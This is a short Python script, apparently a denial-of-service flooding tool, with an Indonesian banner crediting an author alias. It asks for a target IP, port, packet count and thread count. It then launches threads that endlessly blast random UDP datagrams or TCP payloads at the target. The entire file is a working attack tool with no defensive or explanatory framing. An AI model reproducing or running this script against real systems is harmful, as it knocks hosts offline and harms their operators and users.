#RenameGuaTembakPalalu
import random
import socket
import threading
import os

os.system("clear")
print("---- AUTHOR : ΣXCITΣD 13 ----")
print("-- GAK USAH ABUSE KONTOL ----")
print("---- TOOLS BY ΣXCITΣD 13 ----")
ip = str(input(" IP:"))
port = int(input(" Port:"))
choice = str(input(" Gas ? ( y / n ) :"))
times = int(input(" Packets :"))
threads = int(input(" Threads :"))
def run():
	data = random._urandom(20000)
	i = random.choice(("[#]","[+]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ΣXCITΣD Attack!!!")
		except:
			print("[!] ΣXCITΣD Attack!!!")

def run2():
	data = random._urandom(696969)
	i = random.choice(("[#]","[+]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ΣXCITΣD Attack!!!")
		except:
			s.close()
			print("[*] Down!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()